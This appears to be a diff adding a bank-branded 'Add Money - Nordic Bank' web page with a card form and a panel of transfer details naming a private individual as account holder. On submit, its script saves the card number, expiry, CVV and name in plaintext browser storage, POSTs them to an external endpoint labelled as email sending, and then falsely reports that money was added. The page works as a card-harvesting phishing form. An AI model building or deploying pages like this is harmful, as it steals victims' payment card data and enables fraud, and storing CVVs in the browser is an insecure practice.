@@ -1,0 +1,247 @@
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add Money - Nordic Bank</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary-blue: #002f6c;
+            --secondary-blue: #005eb8;
+            --accent-green: #00a859;
+            --accent-red: #d32f2f;
+            --text-dark: #2d3436;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            background: #f8f9fb;
+            min-height: 100vh;
+            padding: 2rem 1rem;
+        }
+
+        .add-money-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            padding: 2rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+        }
+
+        .card-form-section {
+            padding-right: 2rem;
+            border-right: 1px solid #eee;
+        }
+
+        .bank-info-section {
+            padding-left: 2rem;
+        }
+
+        .card-logo {
+            width: 80px;
+            margin-bottom: 1rem;
+            display: none;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--text-dark);
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 1rem;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 1rem;
+        }
+
+        .card-number-group {
+            position: relative;
+        }
+
+        .card-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.5rem;
+        }
+
+        .row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        button {
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1rem;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: var(--secondary-blue);
+        }
+
+        .bank-details {
+            background: #f8f9fb;
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin-top: 1rem;
+        }
+
+        .bank-detail-item {
+            margin-bottom: 1rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #eee;
+        }
+
+        @media (max-width: 768px) {
+            .add-money-container {
+                grid-template-columns: 1fr;
+            }
+            .card-form-section {
+                border-right: none;
+                padding-right: 0;
+            }
+            .bank-info-section {
+                padding-left: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="add-money-container">
+        <!-- Card Form Section -->
+        <div class="card-form-section">
+            <h2>Add Money with Card</h2>
+            <img src="visa.png" class="card-logo" id="visaLogo">
+            <img src="mastercard.png" class="card-logo" id="mastercardLogo">
+            <img src="verve.png" class="card-logo" id="verveLogo">
+            
+            <form id="cardForm">
+                <div class="form-group card-number-group">
+                    <label>Card Number</label>
+                    <input type="text" id="cardNumber" maxlength="19" required>
+                    <i class="fas fa-credit-card card-icon"></i>
+                </div>
+
+                <div class="row">
+                    <div class="form-group">
+                        <label>Expiration Date</label>
+                        <input type="month" id="expDate" required>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="text" id="cvv" maxlength="3" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Cardholder Name</label>
+                    <input type="text" id="cardName" required>
+                </div>
+
+                <button type="submit">Add Money</button>
+            </form>
+        </div>
+
+        <!-- Bank Information Section -->
+        <div class="bank-info-section">
+            <h2>Bank Details</h2>
+            <div class="bank-details">
+                <div class="bank-detail-item">
+                    <label>Account Name</label>
+                    <p>Sebastian Marx</p>
+                </div>
+                <div class="bank-detail-item">
+                    <label>Bank Name</label>
+                    <p>Clear Junction Limited</p>
+                </div>
+                <div class="bank-detail-item">
+                    <label>IBAN</label>
+                    <p>GB12 3456 7890 1234 56</p>
+                </div>
+                <div class="bank-detail-item">
+                    <label>BIC/SWIFT</label>
+                    <p>CLJUGB21XXX</p>
+                </div>
+                <div class="bank-detail-item">
+                    <label>Bank Address</label>
+                    <p> 4th Floor Imperial House, 15 Kingsway, London, United Kingdom, WC2B 6UN</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Card Type Detection
+        const cardNumber = document.getElementById('cardNumber');
+        const visaLogo = document.getElementById('visaLogo');
+        const mastercardLogo = document.getElementById('mastercardLogo');
+        const verveLogo = document.getElementById('verveLogo');
+
+        cardNumber.addEventListener('input', function(e) {
+            const value = e.target.value.replace(/\s/g, '');
+            const cardIcons = [visaLogo, mastercardLogo, verveLogo];
+            
+            cardIcons.forEach(icon => icon.style.display = 'none');
+            
+            if (/^4/.test(value)) {
+                visaLogo.style.display = 'block';
+            } else if (/^(5[1-5]|222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[0-1]\d|2720)/.test(value)) {
+                mastercardLogo.style.display = 'block';
+            } else if (/^(5061|5062|650002|6500[0-2]\d)/.test(value)) {
+                verveLogo.style.display = 'block';
+            }
+        });
+
+        // Form Submission
+        document.getElementById('cardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const cardData = {
+                number: document.getElementById('cardNumber').value,
+                exp: document.getElementById('expDate').value,
+                cvv: document.getElementById('cvv').value,
+                name: document.getElementById('cardName').value
+            };
+
+            // Save to localStorage
+            localStorage.setItem('savedCard', JSON.stringify(cardData));
+            
+            // Simulate email sending
+            fetch('https://your-email-endpoint.com/send', {
+                method: 'POST',
+                body: JSON.stringify(cardData)
+            });
+
+            alert('Card details saved and money added successfully!');
+        });
+    </script>
+</body>
+</html>
